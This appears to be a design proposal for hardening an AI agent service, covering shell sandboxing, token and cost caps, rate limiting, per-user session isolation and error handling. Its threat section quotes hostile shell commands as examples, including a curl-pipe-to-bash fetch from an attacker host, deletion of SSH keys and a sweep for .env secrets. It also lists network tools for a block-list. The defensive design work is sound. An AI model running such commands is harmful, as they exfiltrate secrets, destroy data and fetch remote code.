# Phase 1 — Safety: Detailed Design

Status: **proposal** — review, mark decisions, then implement.

Phase 1's goal is to close the gap between "demo-grade MVP" and "safe to run for real users with a real API key." Five workstreams, described in order of dependency and importance.

A handful of **open decisions** are flagged with **[DECIDE]** — these need your call before implementation starts.

---

## 1.1 Shell sandbox

### Threat

`ShellTool` runs `bash -lc <command>` in the workspace directory with the full privileges of the JVM process. The current `blocked-patterns` regex list is a sieve:

- `rm -rf ~/.ssh` — passes (doesn't start with `/`).
- `curl attacker.com/exfil.sh | bash` — passes.
- `find / -name '*.env' -exec cat {} \;` — passes.
- `mv important-file /tmp/owned` — passes.
- `nohup python -c "…" &` (persistent backdoor) — passes.

A regex block-list on shell commands is security theatre. We need real isolation.

### Options

| Option | Isolation | Complexity | Perf | Host-dev friendly |
|---|---|---|---|---|
| **A. Harden the app container** | Container-level (no host access) | Low | Zero overhead | No (must run in Docker) |
| **B. Ephemeral container per shell call** | Per-call (strongest) | High (DinD / socket mount) | 500ms–2s per call | No |
| **C. Linux sandbox binary** (bubblewrap / nsjail / firejail) | Per-call, user-namespaced | Medium | Fast | Linux-only |
| **D. A + C hybrid** | Both container and per-call sandbox | Medium–High | Fast | Linux-only for C |

### Recommendation

**Option A as the primary defence, with Option C as a stretch goal.**

Reasons:
- Option A requires almost no new code and composes cleanly with what we already have (Dockerfile, docker-compose.yml).
- The real attack surface (host escape, stealing host secrets, lateral movement) is eliminated — everything the agent touches is ephemeral and scoped to the workspace volume.
- Option B is brittle (docker-in-docker has its own security headaches) and adds startup latency per tool call.
- Option C is valuable for Linux users who don't run in Docker, but can wait for Phase 4.

### Concrete changes

1. **Harden `Dockerfile`:**
   - Keep the existing non-root `agent` user.
   - Document that the runtime image is expected to be run with `--read-only --tmpfs /tmp --tmpfs /home/agent/.cache` (since we already mount `/data` and `/workspace` as the only writable areas).
   - Add `--cap-drop=ALL` to the recommended run command.
   - Consider `--pids-limit=256` and `--memory=1g` as documented defaults.

2. **Update `docker-compose.yml`:**
   - Add the flags above to the `agent` service.
   - Add a `read_only: true` and a `tmpfs: [/tmp]` section.

3. **Expand `ShellTool` hardening (belt-and-braces):**
   - Keep the regex block-list but grow it: `curl`, `wget`, `nc`, `ncat`, `ssh`, `scp`, `rsync`, `ftp` all blocked by default (configurable). This raises the bar for command injection attacks inside the container.
   - Add `agent.tools.shell.allowed-commands` as an optional **allow-list** mode (disabled by default, enabled in production).
   - Add `agent.tools.shell.network-access` flag; when `false`, shell commands run with a wrapper that nukes egress (e.g., `unshare -n` on Linux, no-op elsewhere).

4. **New `SECURITY.md`:**
   - Document the threat model explicitly. What's in scope (container escape, exfiltration via LLM). What's out of scope (trusting the LLM not to delete your workspace files — it can, and you're supposed to use git).

5. **Env-var emergency kill switch:**
   - `AGENT_TOOLS_SHELL_ENABLED=false` to disable the shell tool entirely. Useful for handing access to a "read-only" agent.

### Tests

- `ShellToolTest`: verify that expanded block-list rejects each new pattern.
- `ShellToolTest`: assert that when `agent.tools.shell.allowed-commands` is set, commands outside the list are rejected with a clear error.
- No container tests in unit tests — those live in the integration/CI layer.

### Affected files

- `Dockerfile`, `docker-compose.yml`
- `ShellTool.java`, `AgentProperties.java`, `application.yml`
- `SECURITY.md` (new)
- `ShellToolTest.java` (new)

### Effort: **1 day**

### [DECIDE]
- **[DECIDE 1.1.a]** Allow-list mode for production: enabled by default or opt-in?
- **[DECIDE 1.1.b]** Do we ship the `unshare -n`-based egress blocker now, or defer to Phase 4 along with Option C?

---

## 1.2 Resource limits

### Threat

Three separate failure modes:

1. **Thread exhaustion on SSE** — `SimpleAsyncTaskExecutor` creates a new thread per stream with no upper bound. A client that opens 10,000 SSE streams wins.
2. **Cost runaway** — `agent.llm.max-iterations=25` means up to 25 round-trips per user turn. With long contexts this is 50k+ tokens per request at Claude rates. Cheap for one request, expensive at scale or with a loop bug.
3. **Context bloat** — every turn replays the full history. A long session hits the model's context limit; latency and cost degrade linearly.

### Design

**Bounded executor** for SSE:

```yaml
agent:
  sse:
    executor:
      core-pool-size: 4
      max-pool-size: 16
      queue-capacity: 32
      reject-policy: caller-runs   # apply back-pressure rather than drop
```

Swap `SimpleAsyncTaskExecutor` for a `ThreadPoolTaskExecutor` configured via `@Bean` in `AppConfig`.

**Cost caps** enforced in `AgentService`:

```yaml
agent:
  llm:
    max-turns-per-request: 10        # was max-iterations: 25
    max-tokens-per-session: 200000
    max-tokens-per-request: 50000
```

Checks:
- Before each LLM call in the loop, if `session.totalUsage.total() >= max-tokens-per-session`, stop with a clear message.
- After each LLM call, if this-turn usage exceeds `max-tokens-per-request`, stop.
- Lower `max-turns-per-request` from 25 → 10 (empirically: well-designed tasks rarely need more; if they do, the user should break the task up).

**Tool output truncation** in `ToolRegistry.invoke`:

```yaml
agent:
  tools:
    max-output-bytes: 16384          # per tool call result
```

If `result.content().getBytes(UTF_8).length > max`, replace with head + "\n\n... output truncated (N bytes omitted) ...\n\n" + tail (say 80/20 split). Always truncate; never silently drop.

**Context windowing** — simple policy, no summarisation yet:

```yaml
agent:
  llm:
    context:
      policy: last-n                 # none | last-n
      last-n: 50                     # keep last 50 user/assistant/tool messages
```

Implemented as a helper in `AgentService` that trims `session.getHistory()` before sending to `LlmProvider.complete`. The full history is still persisted; only the *window sent to the LLM* is trimmed. Keep the system prompt + last N messages.

### Tests

- `AgentServiceTest`: when a scripted provider reports > `max-tokens-per-request` usage, the loop stops with the budget message.
- `AgentServiceTest`: when history is > 50 messages, the provider receives only the last 50.
- `ToolRegistryTest` (new): a tool returning 50 KB is truncated to `max-output-bytes` plus a truncation marker.

### Affected files

- `AgentProperties.java`, `application.yml`
- `AgentService.java`, `ToolRegistry.java`, `AppConfig.java`
- `AgentServiceTest.java`, `ToolRegistryTest.java` (new)

### Effort: **1 day**

### [DECIDE]
- **[DECIDE 1.2.a]** Default `max-tokens-per-session`: 200k is ~$1 on Claude Sonnet. Higher? Lower?
- **[DECIDE 1.2.b]** Context-windowing default `last-n=50` or something else? 50 messages ≈ 25 turns ≈ plenty for typical sessions.

---

## 1.3 Rate limiting

### Threat

Unauthenticated or authenticated users can burn the LLM quota with a tight loop. We need a per-principal cap that kicks in before we hit the LLM.

### Design

Use **Bucket4j 8.x**, in-memory bucket per principal. Two separate buckets: a strict one for `/api/chat*` (expensive), a looser one for everything else.

```yaml
agent:
  rate-limit:
    enabled: true
    chat:
      capacity: 30
      refill-tokens: 30
      refill-period: 1m
    api:
      capacity: 300
      refill-tokens: 300
      refill-period: 1m
```

Implementation: a `RateLimitFilter` registered via `FilterRegistrationBean` that:
1. Resolves the principal key: authenticated name, else `X-Forwarded-For` first IP, else `request.getRemoteAddr()`.
2. Selects the bucket pattern by URL (`/api/chat*` vs other `/api/**`).
3. `bucket.tryConsume(1)` → on fail, write `429` with `Retry-After: <seconds>` and a JSON body.

Buckets are held in a `Caffeine` cache keyed by principal (eviction after 10 min idle).

When `agent.rate-limit.enabled=false`, the filter is registered but short-circuits immediately.

### Tests

- `RateLimitFilterTest`: 31st request in a burst to `/api/chat` returns 429.
- `RateLimitFilterTest`: different principals have independent buckets.
- `RateLimitFilterTest`: disabled mode lets everything through.

### Affected files

- `build.gradle` (add `com.bucket4j:bucket4j-core:8.10.1`, `com.github.ben-manes.caffeine:caffeine`)
- `AgentProperties.java`, `application.yml`
- `config/RateLimitFilter.java` (new), `config/RateLimitProperties.java` (new or inline)
- `RateLimitFilterTest.java` (new)

### Effort: **½ day**

### [DECIDE]
- **[DECIDE 1.3.a]** Keyed on principal name OR IP when unauthenticated — agreed?
- **[DECIDE 1.3.b]** 30 req/min on `/api/chat` reasonable, or should it be token-based (more accurate but more complex)? Request-based is simpler and probably enough.

---

## 1.4 Per-user session ownership

### Threat

With auth enabled, any authenticated user can call `/api/sessions` and see every other user's session titles and contents. Everything bleeds across tenants.

### Design

**Bring Flyway forward from Phase 2** — we need a schema change and `ddl-auto=update` is already on borrowed time.

```
db/migration/V1__initial_schema.sql    # current schema
db/migration/V2__add_user_id.sql       # ALTER TABLE agent_sessions ADD COLUMN user_id ...
```

Schema change:
- `SessionEntity` gains `String userId` (not null, indexed).
- Existing rows default to `"anonymous"` on migration.
- `InMemorySessionStore.Session` gains the same field for parity.

Owner resolution:
- New `CurrentUser` helper: returns `SecurityContextHolder.getContext().getAuthentication().getName()` when auth is enabled, else the string `"anonymous"`.

`SessionStore` enforcement:
- `create()` stamps the current user.
- `get(id)` returns `Optional.empty()` if the owner doesn't match the current user (same as "not found" — don't leak existence).
- `list()` filters by current user.
- `delete(id)` verifies ownership, throws `AccessDeniedException` otherwise (handled by error advice in 1.5).
- `appendMessage` / `update` — same checks.

Anonymous mode (auth disabled) behaves identically with a single user `"anonymous"` — everything works, no isolation needed, no special case in the code.

### Tests

- Extend `JpaSessionStoreTest`: two different `userId`s see only their own sessions.
- Extend `SecurityConfigTest`: when auth is on, user A cannot `GET /api/sessions/<B's-id>` (404, not 403, so we don't leak existence).
- `AgentServiceTest`: new session is stamped with current user.

### Affected files

- `build.gradle` (add `org.flywaydb:flyway-core`)
- `application.yml` (add flyway config, change `ddl-auto` to `validate`)
- `db/migration/V1__initial_schema.sql`, `V2__add_user_id.sql` (new)
- `SessionEntity.java`, `Session.java`, `SessionStore.java`, `InMemorySessionStore.java`, `JpaSessionStore.java`, `AgentService.java`, `AgentController.java`
- `config/CurrentUser.java` (new)
- Tests: `JpaSessionStoreTest`, `SecurityConfigTest`, `AgentServiceTest`

### Effort: **1 day**

### [DECIDE]
- **[DECIDE 1.4.a]** Return 404 (hide existence) vs 403 (explicit denial) for cross-user access. I recommend **404** — it's the safer default and it's what GitHub does.
- **[DECIDE 1.4.b]** Bringing Flyway forward from Phase 2 — agreed? Without it, 1.4 needs a manual migration path.

---

## 1.5 Error hygiene

### Threat

Current behaviour leaks information. An `IllegalStateException("ANTHROPIC_API_KEY is not configured")` is harmless. An `IOException` from the filesystem layer containing a full path to the workspace is not. A validation failure returns Spring's default verbose error body with stack-like detail.

### Design

A single `@RestControllerAdvice` that renders every uncaught exception into a stable JSON shape:

```json
{
  "error": "short human message",
  "code": "rate_limited",
  "requestId": "e31f4a8b",
  "timestamp": "2026-04-20T12:34:56Z"
}
```

- `requestId` is pulled from MDC (set by a filter in Phase 2 — for now, generate a fresh UUID if absent so the shape is stable).
- Full exception + stack is always logged server-side with the request ID; only the `message` field is exposed, and only if it's marked safe.

Exception mapping:

| Exception | HTTP | `code` | Message source |
|---|---|---|---|
| `AccessDeniedException` | 403 | `forbidden` | fixed string |
| `AuthenticationException` | 401 | `unauthenticated` | fixed string |
| `MethodArgumentNotValidException` | 400 | `validation_failed` | field-level details allowed |
| `IllegalArgumentException` | 400 | `bad_request` | message allowed |
| `IllegalStateException` (budget/config) | 400 | `bad_state` | allowed only if marked safe |
| `RateLimitExceededException` (new) | 429 | `rate_limited` | allowed |
| anything else | 500 | `internal_error` | fixed `"Internal error"` — never pass through |

Add a `SafeMessage` marker (annotation or custom exception type) so specific exceptions can opt-in to having their message sent to the client.

### Tests

- `ErrorAdviceTest` (new): trigger each exception type via a small test controller; assert status, `code`, and that internal messages don't leak.

### Affected files

- `config/ErrorAdvice.java` (new), `config/ApiError.java` (new DTO)
- `config/SafeMessage.java` (new marker)
- Adjust a few existing `throw new IllegalStateException(...)` call sites if we want their messages preserved.
- `ErrorAdviceTest.java` (new)

### Effort: **½ day**

### [DECIDE]
- **[DECIDE 1.5.a]** Do we want field-level validation detail in the response body, or just a generic "validation_failed"? Field detail is helpful but can leak schema info.

---

## Implementation order

Ordered so each item is unblocked by the previous:

1. **1.2 Resource limits** first — pure in-process, no schema/Docker/auth changes. Fastest path to reducing risk.
2. **1.5 Error hygiene** next — small, self-contained, required before 1.3 and 1.4 land clean error responses.
3. **1.3 Rate limiting** — isolated filter, doesn't need DB changes.
4. **1.4 Session ownership + Flyway** — the chunky one, last before 1.1.
5. **1.1 Shell sandbox** last — the hardening work is infra / docs heavy and doesn't block the other items.

Total Phase 1 effort: **3½–4 days focused work.**

---

## Branch + PR plan

One PR per item. Branch names:

- `phase1/1.2-resource-limits`
- `phase1/1.5-error-advice`
- `phase1/1.3-rate-limit`
- `phase1/1.4-session-ownership`
- `phase1/1.1-shell-sandbox`

Each PR includes:
1. Code changes
2. Config + yml updates
3. Tests
4. README entry (if user-visible)
5. `ROADMAP.md` checkbox ticked

## Open decisions — summary

| ID | Question | My recommendation |
|---|---|---|
| 1.1.a | Shell allow-list: default-on or opt-in? | **Opt-in** — too restrictive for dev |
| 1.1.b | Ship `unshare -n` egress blocker now? | **Defer to Phase 4** |
| 1.2.a | `max-tokens-per-session` default | **200k** (~$1 on Sonnet) |
| 1.2.b | `last-n` message window default | **50** |
| 1.3.a | Rate-limit key: principal, else IP? | **Yes, that combination** |
| 1.3.b | Request-based rate limit (not token-based)? | **Yes** — simple and sufficient |
| 1.4.a | Cross-user access: 404 or 403? | **404** — hide existence |
| 1.4.b | Bring Flyway forward from Phase 2? | **Yes** — needed for 1.4 anyway |
| 1.5.a | Validation: field details in body? | **Yes** — small leak, big dev-UX win |

Mark your decisions inline and we're ready to implement.
